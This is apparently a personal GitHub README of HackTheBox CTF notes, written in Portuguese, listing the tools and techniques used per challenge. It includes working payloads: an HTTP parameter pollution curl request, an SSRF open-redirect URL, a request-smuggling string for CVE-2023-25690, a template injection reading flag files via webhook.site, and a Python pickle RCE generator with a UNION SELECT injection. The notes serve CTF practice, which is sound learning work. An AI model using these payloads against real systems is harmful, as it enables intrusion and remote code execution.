<h1 align="center">Dicas e usos de ferramentas</h1>
<h3 align="center">Técnicas, Vulnerabilidades e Ferramentas que usei para referências em desafios futuros</h3>

# Write-up's:
- [Eternal_loop](https://github.com/GGontijo/CTF-s/blob/main/HackTheBox/Eternal_loop.md)
- [Photon_Lockdown](https://github.com/GGontijo/CTF-s/blob/main/HackTheBox/Photon_Lockdown.md)

# Alguns desafios que fiz porém não escrevi write-up's:

### Eternal Loop:
- fcrackzip

### Photon Lockdown:
- unsquashfs

### 0xBOverchunked:
- sqlmap

### HTBank:
- HTTP Parameter Polution (HPP):
    ```
    curl --location 'http://94.237.55.42:33198/api/withdraw' \
    --form 'account="0"' \
    --form 'amount="0"' \ # Precisa ser zero para o payload passar
    --form 'amount="1337"' #
    ```

### Saturn:
- SSRF (Server Side Request Forgery)

### ProxyAsAService:
- Open Redirect Attack
    ```
    http://94.237.60.170:33195/?url=@0.0.0.0:1337/debug/environment
    ```

### ApacheBlaze:
- HTTP Request Smuggling Attack (CVE-2023-25690)
    ```
    http://94.237.48.205:56566/api/games/click_topia%20HTTP/1.1%0d%0aHost:%20dev.apacheblaze.local%0d%0a%0d%0aGET%20/
    ```
    https://github.com/dhmosfunk/CVE-2023-25690-POC/tree/main#internal-http-request-smuggling-via-header-injection

### RenderQuest:
- https://webhook.site/ -> Injection content {{.FetchServerInfo "cat /flag*"}} 

### C.O.P:
- Pickle Remote Code Execution
    ```
    import pickle
    import base64
    import os

    payload = 'cp flag.txt application/static/.' # Payload

    class RCE:
        def __reduce__(self):
            return os.system, (payload,)

    if __name__ == '__main__':
        print(base64.urlsafe_b64encode(pickle.dumps(RCE())).decode('ascii'))
    ```
    ```
    Injetar payload:
    
    GET http://94.237.49.121:31295/view/' UNION SELECT 'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==
    ```

    Recuperar flag:
    ```
    GET http://94.237.49.121:31295/static/flag.txt
    ```

### EasterBunny:
